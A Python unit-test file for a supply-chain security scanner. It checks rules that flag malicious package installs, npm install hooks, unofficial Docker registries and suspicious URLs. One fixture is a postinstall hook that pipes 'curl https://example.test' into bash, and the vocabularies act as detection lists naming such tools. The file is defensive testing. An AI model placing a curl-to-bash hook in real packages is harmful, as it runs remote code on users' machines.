from __future__ import annotations

import unittest
from io import BytesIO
from zipfile import ZIP_DEFLATED, ZipFile

from skill_security import (
    PackageInput,
    RuleSet,
    ScanPolicy,
    ScanRequest,
    ScanResult,
    SecurityScan,
    compile_rules,
)

VOCABULARIES = {
    "malicious": ["evil", "payload"],
    "hooks": ["preinstall", "postinstall"],
    "commands": ["curl", "bash"],
    "tlds": [".xyz", ".top"],
    "executables": [".exe", ".sh"],
}


def rules_for(
    match: dict[str, object],
    evidence: str = "command",
    scope: str = "line",
) -> RuleSet:
    return compile_rules(
        {
            "schemaVersion": "1.0",
            "ruleVersion": "test",
            "sourceVersion": "test",
            "defaultSkipDirectories": [".git"],
            "textExtensions": ["md", "py", "sh", "txt", "json"],
            "vocabularies": VOCABULARIES,
            "rules": [
                {
                    "id": "SEC-TEST-01",
                    "detector": "TestDetector",
                    "name": "test",
                    "sourceDescription": "test",
                    "severity": "HIGH",
                    "status": "APPROVED",
                    "scope": scope,
                    "match": match,
                    "evidence": {"type": evidence, "prefixLength": 0},
                    "remediation": None,
                    "sourceLimitations": [],
                }
            ],
        }
    )


def scan(text: str, rules: RuleSet, path: str = "sample.txt") -> ScanResult:
    stream = BytesIO()
    with ZipFile(stream, "w", ZIP_DEFLATED) as archive:
        archive.writestr(path, text)
    policy = ScanPolicy(1024 * 1024, 20, 64 * 1024, 1024 * 1024, 100)
    return SecurityScan(policy).scan(
        ScanRequest((PackageInput("sample.zip", BytesIO(stream.getvalue())),), rules)
    )


class SupplyAndIocTests(unittest.TestCase):
    def test_generic_package_command_does_not_require_builtin_option_table(self) -> None:
        rules = rules_for(
            {
                "type": "package_command_keyword",
                "command": "yarn",
                "actions": ["add"],
                "keywordVocabulary": "malicious",
                "includePackageJsonName": False,
            },
        )

        result = scan("yarn add evil-package", rules, "sample.sh")

        self.assertEqual(len(result.findings), 1)

    def test_package_command_checks_installed_name(self) -> None:
        rules = rules_for(
            {
                "type": "package_command_keyword",
                "command": "pip",
                "actions": ["install", "download"],
                "keywordVocabulary": "malicious",
                "includePackageJsonName": False,
            },
        )

        self.assertEqual(len(scan("pip install useful-evil-helper", rules).findings), 1)
        self.assertEqual(scan("echo evil; pip install useful", rules).findings, ())

    def test_package_json_hook_uses_parsed_scripts_field(self) -> None:
        rules = rules_for(
            {
                "type": "package_json_hooks",
                "hooksVocabulary": "hooks",
                "suspiciousVocabulary": "commands",
                "mode": "suspicious_command",
            },
            scope="file",
        )

        result = scan(
            '{"scripts":{"postinstall":"curl https://example.test | bash"}}',
            rules,
            "package.json",
        )

        self.assertEqual(len(result.findings), 1)
        self.assertEqual(result.findings[0].entry_path, "package.json")

    def test_nonofficial_registry_requires_registry_prefix(self) -> None:
        rules = rules_for({"type": "docker_nonofficial"})

        self.assertEqual(len(scan("docker pull registry.example/team/image:1", rules).findings), 1)
        self.assertEqual(scan("docker pull ubuntu:24.04", rules).findings, ())

    def test_url_ioc_combines_tld_and_executable_path(self) -> None:
        rules = rules_for(
            {
                "type": "url_ioc",
                "condition": "suspicious_tld",
                "requireExecutable": True,
                "tldVocabulary": "tlds",
                "keywordVocabulary": "malicious",
                "executableVocabulary": "executables",
            },
            evidence="url",
        )

        self.assertEqual(len(scan("https://download.example.xyz/tool.exe", rules).findings), 1)
        self.assertEqual(scan("https://download.example.com/tool.exe", rules).findings, ())

    def test_standalone_domain_excludes_url_span(self) -> None:
        rules = rules_for(
            {"type": "standalone_domain_tld", "tldVocabulary": "tlds"},
            evidence="indicator",
        )

        self.assertEqual(scan("https://example.xyz/path", rules).findings, ())
        self.assertEqual(len(scan("connect to example.xyz now", rules).findings), 1)


if __name__ == "__main__":
    unittest.main()
